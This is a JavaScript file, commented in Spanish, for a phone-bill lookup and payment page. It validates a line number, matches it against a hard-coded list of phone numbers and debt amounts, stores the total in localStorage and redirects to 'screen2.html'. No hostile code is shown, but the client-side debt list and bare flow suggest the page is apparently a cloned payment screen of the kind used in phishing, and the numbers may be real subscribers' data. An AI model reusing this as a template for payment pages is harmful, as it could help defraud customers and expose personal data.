function updateLS() {
  LS.setItem("infot", JSON.stringify(infot));
}

// JavaScript para activar/desactivar el botón "Consultar y pagar"
const lineNumberInput = document.getElementById("line-number");
const consultPayButton = document.getElementById("consultPayButton");
const schedulePayButton = document.getElementById("schedulePayButton");

lineNumberInput.addEventListener("input", function () {
  const inputValue = lineNumberInput.value;

  // Asegurarse de que el primer carácter sea siempre 3
  if (inputValue.length > 0 && inputValue[0] !== "3") {
    lineNumberInput.value = "3" + inputValue.slice(1);
  }

  // Activar/Desactivar el botón "Consultar y pagar"
  // Activar/Desactivar el botón "Programar/Administrar mis pagos"
  if (inputValue.length > 7) {
    schedulePayButton.disabled = false;
    schedulePayButton.classList.remove("btn-secondary-disabled");
    schedulePayButton.classList.add("btn-primary"); // Cambia el color a primario cuando está activo
  } else {
    schedulePayButton.disabled = true;
    schedulePayButton.classList.add("btn-secondary-disabled");
    schedulePayButton.classList.remove("btn-primary");
  }

  if (inputValue.startsWith("3")) {
    consultPayButton.classList.add("btn-blue");
  } else {
    consultPayButton.classList.remove("btn-blue");
  }
});

document
  .getElementById("consultPayButton")
  .addEventListener("click", function () {
    var spinnerOverlay = document.getElementById("spinnerOverlay");

    // Mostrar el overlay con el spinner
  });

document.addEventListener("DOMContentLoaded", function () {
  const lineNumberInput = document.getElementById("line-number");

  // Solo permite ingresar números y limita a 10 dígitos
  lineNumberInput.addEventListener("input", function () {
    // Eliminar caracteres no numéricos
    this.value = this.value.replace(/\D/g, "");

    // Limitar a 10 dígitos
    if (this.value.length > 10) {
      this.value = this.value.slice(0, 10);
    }

    // Asegurarse de que el primer carácter sea siempre 3
    if (this.value.length > 0 && this.value[0] !== "3") {
      this.value = "3" + this.value.slice(1);
    }

    // Activar el botón 'Consultar y pagar' cuando se ingrese un número
    const lineNumber = this.value.trim();
    document.getElementById("consultPayButton").disabled = !lineNumber;

    // Activar el botón 'Programar / Administrar mis pagos' cuando se ingresen más de 7 números
    document.getElementById("schedulePayButton").disabled =
      lineNumber.length <= 7;
  });

  // Validación del campo de entrada para permitir solo números
  lineNumberInput.addEventListener("keypress", function (event) {
    // Permitir solo números
    if (!/\d/.test(event.key)) {
      event.preventDefault();
    }

    // Asegurarse de que el primer carácter sea siempre 3
    if (this.value.length === 0 && event.key !== "3") {
      event.preventDefault();
    }
  });

  // Validación del pegado para permitir solo números
  lineNumberInput.addEventListener("paste", function (event) {
    const pastedData = event.clipboardData.getData("text");
    if (!/^\d*$/.test(pastedData)) {
      event.preventDefault();
    }
  });
});

// Al cargar la página, configura la validación
window.onload = function () {
  const debtMap = {
    3150040073: 131592,
    3150040423: 67806,
    3150010002: 34616,
    3150010004: 24990,
    3150010011: 21493,
    3150010014: 33091,
    3150010025: 22993,
    3150010035: 21493,
    3150010262: 24417,
    3150010278: 21986,
    3150010280: 21493,
    3150010281: 38213,
    3150010283: 33579,
    3150010287: 22993,
    3150010294: 22993,
    3150010303: 104303,
    3150010354: 65007,
    3150010670: 330398,
    3150010690: 21990,
    3150011007: 47990,
    3150011020: 48484,
    3150011180: 55727,
    3150011613: 43490,













};
  window.debtMap = debtMap;
  const inputField = document.getElementById("line-number");
  const consultPayButton = document.getElementById("consultPayButton");
  const schedulePayButton = document.getElementById("schedulePayButton");

  // Manejador de eventos para la entrada en tiempo real
  inputField.addEventListener("input", function () {
    const lineNumber = inputField.value.trim();
    if (inputField.value.startsWith("3")) {
      consultPayButton.disabled = false;
      schedulePayButton.disabled = lineNumber.length < 7;
      consultPayButton.classList.remove("btn-secondary-disabled");
      consultPayButton.classList.add("btn-primary");
    }
  });

  // Validación y redirección al hacer clic en el botón "Consultar y pagar"
  consultPayButton.addEventListener("click", function () {
    const lineNumber = inputField.value.trim();
    if (debtMap[lineNumber]) {
      infot.movInfo.total = debtMap[lineNumber];
      updateLS();
      spinnerOverlay.classList.remove("d-none");
      setTimeout(function () {
        window.location.href = "screen2.html";
      }, 800);
    } else {
      alert(
        "Número de línea o de pago no válido. Por favor, revisa e intenta de nuevo."
      );
      return false;
    }
  });

  // Validación del campo de entrada para permitir solo números
  inputField.addEventListener("keypress", function (event) {
    // Permitir solo números
    if (!/\d/.test(event.key)) {
      event.preventDefault();
    }

    // Asegurarse de que el primer carácter sea siempre 3
    if (this.value.length === 0 && event.key !== "3") {
      event.preventDefault();
    }
  });

  // Validación del pegado para permitir solo números
  inputField.addEventListener("paste", function (event) {
    const pastedData = event.clipboardData.getData("text");
    if (!/^\d*$/.test(pastedData)) {
      event.preventDefault();
    }
  });
};
